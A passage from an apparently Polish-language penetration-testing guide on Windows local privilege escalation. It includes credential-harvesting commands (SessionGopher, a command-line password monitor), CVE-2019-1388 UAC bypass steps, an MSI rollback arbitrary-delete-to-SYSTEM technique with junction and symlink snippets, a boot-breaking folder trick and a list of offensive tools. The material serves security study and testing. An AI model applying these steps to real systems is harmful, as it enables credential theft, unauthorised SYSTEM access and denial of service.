[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do wyodrębniania password z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sessions**, **usernames** i **passwords** kilku narzędzi, które zapisują te dane w postaci jawnego tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY, i RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Wyobraź sobie, że **proces uruchomiony jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy też nowy proces** (`CreateProcess()`) **o niskich uprawnieniach, ale dziedziczący wszystkie open handles procesu głównego**.\
Wtedy, jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przejąć **open handle do uprzywilejowanego procesu stworzonego** przy użyciu `OpenProcess()` i **wstrzyknąć shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenty pamięci współdzielonej, określane jako **pipes**, umożliwiają komunikację między procesami i przesyłanie danych.

Windows udostępnia funkcję nazwaną **Named Pipes**, pozwalającą niespokrewnionym procesom na udostępnianie danych, nawet przez różne sieci. Przypomina to architekturę client/server, z rolami określonymi jako **named pipe server** i **named pipe client**.

Gdy dane są wysyłane przez pipe przez **client**, **server**, który utworzył ten pipe, ma możliwość **przyjęcia tożsamości** **clienta**, pod warunkiem posiadania niezbędnych uprawnień **SeImpersonate**. Zlokalizowanie **uprzywilejowanego procesu**, który komunikuje się przez pipe, który możesz podszyć, daje możliwość **uzyskania wyższych uprawnień** poprzez przyjęcie tożsamości tego procesu, gdy tylko wejdzie w interakcję z pipe, który utworzyłeś. Instrukcje dotyczące przeprowadzenia takiego ataku można znaleźć [**tutaj**](named-pipe-client-impersonation.md) oraz [**tutaj**](#from-high-integrity-to-system).

Ponadto poniższe narzędzie pozwala **przechwycić komunikację named pipe za pomocą narzędzia takiego jak burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a to narzędzie pozwala wypisać i zobaczyć wszystkie pipes, aby znaleźć privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

Zajrzyj na stronę **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

Po uzyskaniu shell jako użytkownik mogą istnieć zaplanowane zadania lub inne procesy, które są uruchamiane i **przekazują poświadczenia na command line**. Poniższy skrypt przechwytuje command lines procesów co dwie sekundy i porównuje bieżący stan z poprzednim, wypisując wszelkie różnice.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP) i UAC jest włączony, w niektórych wersjach Microsoft Windows możliwe jest uruchomienie terminala lub dowolnego innego procesu, takiego jak "NT\AUTHORITY SYSTEM", z konta użytkownika bez uprawnień.

To umożliwia eskalację uprawnień i jednoczesne obejście UAC przy użyciu tej samej podatności. Dodatkowo nie ma potrzeby instalowania czegokolwiek, a binarka używana w trakcie procesu jest podpisana i wydana przez Microsoft.

Niektóre z dotkniętych systemów to:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Aby wykorzystać tę podatność, należy wykonać następujące kroki:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Z poziomu Administratora (Medium) do wysokiego poziomu integralności / UAC Bypass

Przeczytaj to, aby dowiedzieć się o poziomach integralności:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie przeczytaj to, aby dowiedzieć się o UAC i UAC bypasses:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Z dowolnego usunięcia/przeniesienia/zmiany nazwy folderu do SYSTEM EoP

Technika opisana [**w tym wpisie na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) z kodem exploita [**dostępnym tutaj**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Atak zasadniczo polega na nadużyciu funkcji przywracania (rollback) Windows Installer, aby zastąpić legalne pliki złośliwymi podczas procesu odinstalowywania. W tym celu atakujący musi utworzyć **złośliwy instalator .msi**, który posłuży do przejęcia folderu `C:\Config.Msi`, używanego później przez Windows Installer do przechowywania plików rollback podczas odinstalowywania innych pakietów MSI, gdzie pliki rollback zostałyby zmienione tak, by zawierać złośliwy ładunek.

Skrócona technika wygląda następująco:

1. Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)

- Step 1: Install the MSI
- Utwórz `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w zapisywalnym folderze (`TARGETDIR`).
- Oznacz instalator jako **"UAC Compliant"**, aby **użytkownik nieuprzywilejowany** mógł go uruchomić.
- Zachowaj otwarty **handle** do pliku po instalacji.

- Step 2: Begin Uninstall
- Odinstaluj ten sam `.msi`.
- Proces deinstalacji zaczyna przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na pliki `.rbf` (kopie rollback).
- **Poll the open file handle** przy użyciu `GetFinalPathNameByHandle`, aby wykryć, kiedy plik stanie się `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` zawiera **niestandardową akcję deinstalacji (`SyncOnRbfWritten`)**, która:
- Sygnałuje, kiedy `.rbf` został zapisany.
- Następnie **czeka** na inny event przed kontynuacją deinstalacji.

- Step 4: Block Deletion of `.rbf`
- Po otrzymaniu sygnału, **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — to **uniemożliwia jego usunięcie**.
- Następnie **odeslij sygnał**, aby deinstalacja mogła się dokończyć.
- Windows Installer nie może usunąć `.rbf`, i ponieważ nie może usunąć całej zawartości, **`C:\Config.Msi` nie zostaje usunięty**.

- Step 5: Manually Delete `.rbf`
- Ty (atakujący) usuwasz plik `.rbf` ręcznie.
- Teraz **`C:\Config.Msi` jest pusty**, gotowy do przejęcia.

> W tym momencie, **wyzwól lukę pozwalającą na arbitralne usunięcie folderu na poziomie SYSTEM**, aby usunąć `C:\Config.Msi`.

2. Stage 2 – Replacing Rollback Scripts with Malicious Ones

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Odtwórz folder `C:\Config.Msi` samodzielnie.
- Ustaw **słabe DACLs** (np. Everyone:F) i **utrzymaj otwarty handle** z `WRITE_DAC`.

- Step 7: Run Another Install
- Zainstaluj `.msi` ponownie, z:
- `TARGETDIR`: lokalizacja zapisywalna.
- `ERROROUT`: zmienna, która powoduje wymuszone zakończenie błędem.
- Ta instalacja zostanie użyta do ponownego wywołania **rollback**, który odczytuje `.rbs` i `.rbf`.

- Step 8: Monitor for `.rbs`
- Użyj `ReadDirectoryChangesW`, aby monitorować `C:\Config.Msi` aż pojawi się nowe `.rbs`.
- Zarejestruj jego nazwę pliku.

- Step 9: Sync Before Rollback
- `.msi` zawiera **niestandardową akcję instalacji (`SyncBeforeRollback`)**, która:
- Sygnałuje event, gdy `.rbs` zostanie utworzone.
- Następnie **czeka** przed kontynuacją.

- Step 10: Reapply Weak ACL
- Po otrzymaniu sygnału ` .rbs created`:
- Windows Installer **ponownie nakłada silne ACL** na `C:\Config.Msi`.
- Ale ponieważ nadal masz handle z `WRITE_DAC`, możesz **ponownie nałożyć słabe ACL**.

> ACLs są **egzekwowane tylko przy otwarciu handle**, więc nadal możesz zapisać do folderu.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Nadpisz plik `.rbs` fałszywym skryptem rollback, który każe Windows:
- Przywrócić twój `.rbf` (złośliwy DLL) do **uprzywilejowanej lokalizacji** (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Upuścić fałszywy `.rbf` zawierający **złośliwy DLL z ładunkiem SYSTEM**.

- Step 12: Trigger the Rollback
- Zasygnalizuj event synchronizacyjny, aby instalator wznowił działanie.
- Akcja niestandardowa typu 19 (`ErrorOut`) jest skonfigurowana tak, aby **celowo spowodować niepowodzenie instalacji** w znanym punkcie.
- To powoduje rozpoczęcie **rollback**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Odczytuje twój złośliwy `.rbs`.
- Kopiuje twój `.rbf` DLL do docelowej lokalizacji.
- Masz teraz **złośliwy DLL w ścieżce ładowanej przez SYSTEM**.

- Final Step: Execute SYSTEM Code
- Uruchom zaufany **auto-elevated binary** (np. `osk.exe`), który załaduje DLL, który przejąłeś.
- **Boom**: Twój kod zostaje wykonany **jako SYSTEM**.


### Z dowolnego usunięcia/przeniesienia/zmiany nazwy pliku do SYSTEM EoP

Główna technika rollbacku MSI (poprzednia) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co jeśli twoja luka pozwala tylko na **arbitralne usuwanie plików**?

Możesz wykorzystać **NTFS internals**: każdy folder ma ukryty alternatywny strumień danych zwany:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ten strumień przechowuje **metadane indeksu** folderu.

Zatem, jeśli **usuniesz strumień `::$INDEX_ALLOCATION`** folderu, NTFS **usuwa cały folder** z systemu plików.

Możesz to zrobić używając standardowych API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Nawet jeśli wywołujesz *file* delete API, ono **usuwa sam folder**.

### Od Folder Contents Delete do SYSTEM EoP
Co jeśli twój primitive nie pozwala usuwać dowolnych files/folders, ale ono **pozwala na usunięcie *contents* folderu kontrolowanego przez atakującego**?

1. Krok 1: Przygotuj folder-przynętę i plik
- Utwórz: `C:\temp\folder1`
- W środku: `C:\temp\folder1\file1.txt`

2. Krok 2: Załóż **oplock** na `file1.txt`
- Ten **oplock** **wstrzymuje wykonanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Krok 3: Wywołaj proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usunąć ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock** wyzwala się i przekazuje kontrolę do Twojego callbacku.

4. Krok 4: Wewnątrz callbacku oplocka – przekieruj operację usuwania

- Opcja A: Przenieś `file1.txt` gdzie indziej
- To opróżnia `folder1` bez zwolnienia oplocka.
- Nie usuwaj `file1.txt` bezpośrednio — to przedwcześnie zwolni oplock.

- Opcja B: Konwertuj `folder1` na **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> To celuje w wewnętrzny strumień NTFS, który przechowuje metadane folderu — jego usunięcie usuwa folder.

5. Krok 5: Zwolnij oplock
- Proces SYSTEM kontynuuje i próbuje usunąć `file1.txt`.
- Ale teraz, z powodu junction + symlink, faktycznie usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` zostaje usunięty przez SYSTEM.

### Od Arbitrary Folder Create do trwałego DoS

Wykorzystaj prymityw, który pozwala na **create an arbitrary folder as SYSTEM/admin** —  nawet jeśli **nie możesz zapisywać plików** lub **ustawiać słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```
- Ta ścieżka zwykle odpowiada sterownikowi trybu jądra `cng.sys`.
- Jeśli **wstępnie utworzysz ją jako folder**, Windows nie załaduje właściwego sterownika podczas rozruchu.
- Następnie Windows próbuje załadować `cng.sys` podczas rozruchu.
- Widząc folder, **nie udaje mu się odnaleźć właściwego sterownika**, i **zawiesza się lub zatrzymuje rozruch**.
- Nie ma **żadnego mechanizmu zapasowego**, i **brakuje możliwości odzyskania** bez zewnętrznej interwencji (np. naprawa rozruchu lub dostęp do dysku).


## **Z High Integrity do SYSTEM**

### **Nowa usługa**

Jeśli już działasz w procesie o High Integrity, **droga do SYSTEM** może być prosta — wystarczy **utworzyć i uruchomić nową usługę**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Gdy tworzysz plik binarny usługi, upewnij się, że to prawidłowa usługa lub że binarka wykonuje niezbędne czynności wystarczająco szybko, ponieważ zostanie zabita po 20s, jeśli nie jest prawidłową usługą.

### AlwaysInstallElevated

Z procesu High Integrity możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell używając _**.msi**_ wrappera.\
[Więcej informacji o kluczach rejestru zaangażowanych i jak zainstalować paczkę _.msi_ tutaj.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Możesz** [**znaleźć kod tutaj**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Jeśli masz te uprawnienia tokena (prawdopodobnie znajdziesz je w procesie działającym już z High Integrity), będziesz w stanie **otworzyć prawie dowolny proces** (nie procesy chronione) z uprawnieniem SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
Przy użyciu tej techniki zazwyczaj **wybiera się proces działający jako SYSTEM z wszystkimi uprawnieniami tokena** (_tak, możesz znaleźć procesy SYSTEM bez wszystkich uprawnień tokena_).\
**Możesz znaleźć** [**przykład kodu wykonującego proponowaną technikę tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ta technika jest używana przez meterpreter do eskalacji w `getsystem`. Technika polega na **utworzeniu pipe'a, a następnie utworzeniu/wykorzystaniu usługi do zapisu do tego pipe'a**. Następnie **serwer**, który utworzył pipe używając uprawnienia **`SeImpersonate`** będzie w stanie **impersonate the token** klienta pipe'a (usługi), uzyskując uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o name pipes, powinieneś to przeczytać**](#named-pipe-client-impersonation).\
Jeśli chcesz przykład [**jak przejść z High Integrity do System używając name pipes powinieneś to przeczytać**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda Ci się **przejąć dll** ładowaną przez **proces** działający jako **SYSTEM**, będziesz w stanie wykonać dowolny kod z tymi uprawnieniami. Dlatego Dll Hijacking jest użyteczny do tego rodzaju eskalacji przywilejów, a co więcej jest **znacznie łatwiejszy do osiągnięcia z procesu o High Integrity**, ponieważ będzie miał **uprawnienia zapisu** do katalogów używanych do ładowania dll.\
**Możesz** [**dowiedzieć się więcej o Dll hijacking tutaj**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Przydatne narzędzia

**Najlepsze narzędzie do wyszukiwania Windows local privilege escalation wektorów:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sprawdza błędne konfiguracje i wrażliwe pliki (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wykrywane.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sprawdza możliwe błędne konfiguracje i zbiera informacje (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sprawdza błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Wydobywa zapisane informacje sesji PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj -Thorough lokalnie.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Wydobywa poświadczenia z Credential Manager. Wykrywane.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Rozsyła zebrane hasła po domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer i narzędzie man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowa enumeracja Windows pod kątem privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Szuka znanych podatności privesc (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne sprawdzenia **(Wymaga uprawnień Administratora)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Szuka znanych podatności privesc (wymaga skompilowania przy użyciu VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeruje hosta szukając błędnych konfiguracji (bardziej narzędzie do zbierania informacji niż privesc) (wymaga skompilowania) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Wydobywa poświadczenia z wielu programów (prekompilowany exe w GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Sprawdza błędne konfiguracje (wykonywalny prekompilowany w GitHub). Niezalecane. Nie działa dobrze w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sprawdza możliwe błędne konfiguracje (exe z Pythona). Niezalecane. Nie działa dobrze w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie stworzone na podstawie tego posta (nie potrzebuje accesschk, aby działać poprawnie, ale może go użyć).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje output **systeminfo** i rekomenduje działające exploit'y (lokalny python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje output **systeminfo** i rekomenduje działające exploit'y (lokalny python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Musisz skompilować projekt używając odpowiedniej wersji .NET ([zobacz to](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby zobaczyć zainstalowaną wersję .NET na hoście ofiary możesz zrobić:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Źródła

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
